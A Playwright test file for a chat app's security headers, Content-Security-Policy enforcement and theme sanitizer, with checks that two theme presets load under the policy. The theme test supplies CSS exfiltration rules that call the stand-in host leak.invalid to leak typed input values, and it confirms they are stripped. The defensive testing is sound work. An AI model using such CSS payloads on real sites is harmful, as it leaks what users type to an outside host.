import { expect, test, type Page } from '@playwright/test';
import { logIn, openChannel, role, send } from './app';
import { createSpaceWithChannel, createUser } from './matrix';

/**
 * The app runs under production's security headers (deploy/security-headers.conf, which `vite
 * preview` serves too): the policy is sent, and the app itself never trips it. And a theme can't
 * read what's on the page (app/themeSanitize.ts).
 */

/** Every Content-Security-Policy violation the page reports, from before the app's first script. */
async function watchViolations(page: Page): Promise<() => Promise<string[]>> {
  await page.addInitScript(() => {
    const found: string[] = [];
    (window as unknown as { __csp: string[] }).__csp = found;
    document.addEventListener('securitypolicyviolation', (e) => found.push(`${e.effectiveDirective} ${e.blockedURI}`));
  });
  return () => page.evaluate(() => (window as unknown as { __csp: string[] }).__csp);
}

test('the app is served with its security headers and nothing in it is blocked', async ({ page }) => {
  const violations = await watchViolations(page);
  const response = await page.goto('/');
  const headers = response!.headers();
  expect(headers['content-security-policy']).toContain("script-src 'self' 'wasm-unsafe-eval'");
  expect(headers['content-security-policy']).toContain("frame-ancestors 'none'");
  expect(headers['x-frame-options']).toBe('DENY');
  expect(headers['x-content-type-options']).toBe('nosniff');

  // Signed in (encryption's WebAssembly, the first sync), in a channel, sending.
  const alice = await createUser('alice');
  const { spaceName } = await createSpaceWithChannel(alice);
  await logIn(page, alice);
  await openChannel(page, spaceName, 'general');
  await send(page, 'hello under a strict policy');
  await role(page, 'server-rail-global-feed').click();
  await expect(role(page, 'global-feed')).toBeVisible();

  expect(await violations()).toEqual([]);
});

test('an inline script is refused', async ({ page }) => {
  const violations = await watchViolations(page);
  await page.goto('/');
  await page.evaluate(() => {
    const script = document.createElement('script');
    script.textContent = 'window.__ran = true';
    document.body.appendChild(script);
  });
  expect(await page.evaluate(() => (window as unknown as { __ran?: boolean }).__ran)).toBeUndefined();
  await expect.poll(violations).toContainEqual(expect.stringMatching(/^script-src-elem inline/));
});

test("a theme can restyle the app but not read what's typed", async ({ page }) => {
  const violations = await watchViolations(page);
  const alice = await createUser('alice');
  await logIn(page, alice);
  await role(page, 'user-panel-settings').click();
  await page.getByRole('button', { name: 'Appearance' }).click();
  await role(page, 'appearance-settings-editor').fill(
    [
      ':root { --nu-color-accent: rgb(1, 2, 3); }',
      'input[value^="a"] { background-image: url(https://leak.invalid/a); }',
      '@media (min-width: 1px) { [aria-label*="Account"] { background-image: url(https://leak.invalid/b); } }',
    ].join('\n')
  );
  await role(page, 'appearance-settings-apply').click();

  await expect(role(page, 'appearance-settings-left-out')).toContainText('2 rules were left out');
  await expect(role(page, 'appearance-settings-left-out')).toContainText('input[value^="a"]');
  const applied = await page.evaluate(() => ({
    css: document.getElementById('nu-theme-override')?.textContent ?? '',
    accent: getComputedStyle(document.documentElement).getPropertyValue('--nu-color-accent').trim(),
  }));
  expect(applied.accent).toBe('rgb(1, 2, 3)');
  expect(applied.css).not.toContain('leak.invalid');
  // The editor still shows the theme as written.
  await expect(role(page, 'appearance-settings-editor')).toHaveValue(/leak\.invalid/);
  expect(await violations()).toEqual([]);
});

test('the Halloween preset dresses the app up, its font and pictures allowed by the policy', async ({ page }) => {
  const violations = await watchViolations(page);
  const alice = await createUser('alice');
  const { spaceName } = await createSpaceWithChannel(alice);
  await logIn(page, alice);
  await openChannel(page, spaceName, 'general');
  await role(page, 'user-panel-settings').click();
  await page.getByRole('button', { name: 'Appearance' }).click();
  await role(page, 'appearance-settings-preset').filter({ hasText: 'Halloween' }).click();
  await role(page, 'appearance-settings-apply').click();
  await expect(role(page, 'appearance-settings-left-out')).toHaveCount(0);
  await page.keyboard.press('Escape');

  const look = await page.evaluate(async () => {
    await document.fonts.load('32px Creepster');
    const panel = document.querySelector('[data-nu-role="user-panel"]')!;
    return {
      font: document.fonts.check('32px Creepster'),
      ears: getComputedStyle(document.querySelector('.nu-server-rail__item--active .nu-server-rail__ear')!).fill,
      cat: getComputedStyle(panel, '::before').backgroundImage,
      lantern: getComputedStyle(document.querySelector('.nu-timeline__welcome-icon')!).backgroundImage,
    };
  });
  expect(look.font).toBe(true);
  expect(look.ears).toBe('rgb(5, 3, 7)');
  expect(look.cat).toContain('data:image/svg+xml');
  expect(look.lantern).toContain('data:image/svg+xml');
  expect(await violations()).toEqual([]);
});

test('the Royal Neon preset puts its cat behind the panels, allowed by the policy', async ({ page }) => {
  // Full effects: Safe (Auto, in a headless browser) leaves every wallpaper out.
  await page.addInitScript(() => localStorage.setItem('nekous_effects', 'full'));
  const violations = await watchViolations(page);
  const alice = await createUser('alice');
  const { spaceName } = await createSpaceWithChannel(alice);
  await logIn(page, alice);
  await openChannel(page, spaceName, 'general');
  await role(page, 'user-panel-settings').click();
  await page.getByRole('button', { name: 'Appearance' }).click();
  await role(page, 'appearance-settings-preset').filter({ hasText: 'Royal Neon' }).click();
  await role(page, 'appearance-settings-apply').click();
  await expect(role(page, 'appearance-settings-left-out')).toHaveCount(0);
  await page.keyboard.press('Escape');

  const wallpaper = role(page, 'wallpaper');
  await expect(wallpaper).toHaveCSS('background-image', /royal-neon-cat\.webp/);
  // The picture itself loads from the build.
  const loaded = await page.evaluate(
    () =>
      new Promise<boolean>((resolve) => {
        const img = new Image();
        img.onload = () => resolve(img.naturalWidth > 0);
        img.onerror = () => resolve(false);
        img.src = '/themes/royal-neon-cat.webp';
      })
  );
  expect(loaded).toBe(true);
  expect(await violations()).toEqual([]);
});
